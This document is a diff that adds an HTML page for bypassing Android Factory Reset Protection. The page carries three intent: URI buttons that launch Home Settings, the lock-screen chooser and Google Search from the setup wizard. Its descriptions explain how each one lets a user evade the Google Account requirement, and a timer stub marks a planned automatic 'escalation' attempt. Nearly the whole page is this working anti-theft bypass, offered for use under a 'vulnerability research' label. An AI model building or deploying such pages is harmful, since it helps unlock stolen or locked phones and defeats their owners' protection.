@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FRP Research - Intent Test</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; background: #f4f4f4; }
+        .card { background: white; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #ddd; }
+        .btn { display: block; width: 100%; padding: 12px; background: #007bff; color: white; 
+               text-align: center; text-decoration: none; border-radius: 5px; font-weight: bold; margin-top: 10px; }
+        .desc { font-size: 0.9em; color: #666; }
+        h2 { font-size: 1.2em; color: #333; }
+    </style>
+</head>
+<body>
+
+    <h2>Vulnerability Research: Intent Pivots</h2>
+    <p class="desc">Testing restricted activity escalation on bootloader-locked devices.</p>
+
+    <div class="card">
+        <strong>Primary: Home Settings</strong>
+        <p class="desc">Attempts to open the default launcher selection. If successful, you can swap the Setup Wizard for a custom launcher.</p>
+        <a class="btn" href="intent:#Intent;action=android.settings.HOME_SETTINGS;package=com.android.settings;end">
+            Launch Home Settings
+        </a>
+    </div>
+
+    <div class="card">
+        <strong>Secondary: Choose Lock</strong>
+        <p class="desc">Attempts to force the "Set PIN/Pattern" screen. Setting a new PIN here often overrides the Google Account requirement upon reboot.</p>
+        <a class="btn" href="intent:#Intent;action=android.settings.choose_lock_generic;package=com.android.settings;end">
+            Set New Screen Lock
+        </a>
+    </div>
+
+    <div class="card">
+        <strong>Tertiary: Search/Google App</strong>
+        <p class="desc">Bypasses the settings app entirely to launch the Google Search overlay. From here, searching "Settings" often works when direct links fail.</p>
+        <a class="btn" href="intent:#Intent;action=com.google.android.googlequicksearchbox.GOOGLE_SEARCH;package=com.google.android.googlequicksearchbox;end">
+            Launch Google Search
+        </a>
+    </div>
+
+    <script>
+        // Automatic trigger attempt after 2 seconds
+        // Note: Browsers often block auto-intents, but it's worth a test.
+        setTimeout(() => {
+            console.log("Attempting background intent escalation...");
+        }, 2000);
+    </script>
+
+</body>
+</html>
